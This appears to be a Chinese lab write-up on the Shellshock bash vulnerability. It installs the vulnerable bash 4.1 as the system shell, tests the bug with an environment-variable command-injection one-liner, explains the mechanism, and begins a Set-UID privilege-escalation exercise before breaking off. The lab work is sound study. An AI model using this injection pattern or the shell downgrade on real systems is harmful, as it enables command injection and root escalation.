# Attack

[TOC]

# 2. 进行实验所需的准备
## 1. 环境搭建
以root权限安装4.1版bash（4.2版本以上的漏洞已经被堵上了）
bash4.1 下载地址：http://labfile.oss.aliyuncs.com/bash-4.1.tar.gz

**download:**

```c
# wget http://labfile.oss.aliyuncs.com/bash-4.1.tar.gz
--2019-10-02 19:05:39--  http://labfile.oss.aliyuncs.com/bash-4.1.tar.gz

Resolving labfile.oss.aliyuncs.com (labfile.oss.aliyuncs.com)... 47.110.177.159
Connecting to labfile.oss.aliyuncs.com (labfile.oss.aliyuncs.com)|47.110.177.159|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6598300 (6.3M) [application/octet-stream]
Saving to: ‘bash-4.1.tar.gz’

bash-4.1.tar.gz    100%[==============>]   6.29M  1.07MB/s    in 11s     

2019-10-02 19:05:51 (583 KB/s) - ‘bash-4.1.tar.gz’ saved [6598300/6598300]
```

**Install**

```c
# tar xf bash-4.1.tar.gz   /解压
# cd bash-4.1              /打开
# ./configure              /打开configure文件
# make & make install      /安装

/这几句语句是运行时间最长的，网速不好的情况下在这一步重复输入了很多次。
```
等彩色kali变成黑白kali先，然后最好再重复一次
不要关窗口，要不会变回彩色的

**链接bash**

```c
# rm /bin/bash
# ln -s /usr/local/bin/bash /bin/bash
```


## begin

安装完了，接下来检测是否存在shellshock漏洞。

```c
kali# env x='() { :;}; echo vulnerable' bash -c "echo this is a test "

vulnerable
this is a test

/输出vulnerable,说明bash有漏洞。
```


## 2.预备知识
了解bash自定义函数，只需要函数名就能够调用该函数。

```
$ foo() { echo bar; }
$ foo
> bar
```

这个时候的Bash的环境变量：

`KEY = fooVALUE = () { echo bar; }`

来看看ShellShock漏洞的真身：

```
export foo=’() { :; }; echo Hello World’
bash
>Hello World
```

怎么样？看明白了没？为什么调用bash的时候输出Hello World了呢？ 瞧瞧他内部的情况：

`KEY = fooVALUE = () { :; }; echo Hello World`

bash读取了环境变量，在定义foo之后直接调用了后面的函数。
一旦调用bash，自定义的语句就直接触发。


## 1.攻击Set-UID程序

通过攻击Set-UID程序来获得root权限。

首先，确保安装了带有漏洞的bash版本，并让/bin/sh 指向/bin/bash.

```c
$ sudo ln -sf /bin/bash /bin/sh
```
现在一切就绪，进入下一步吧。
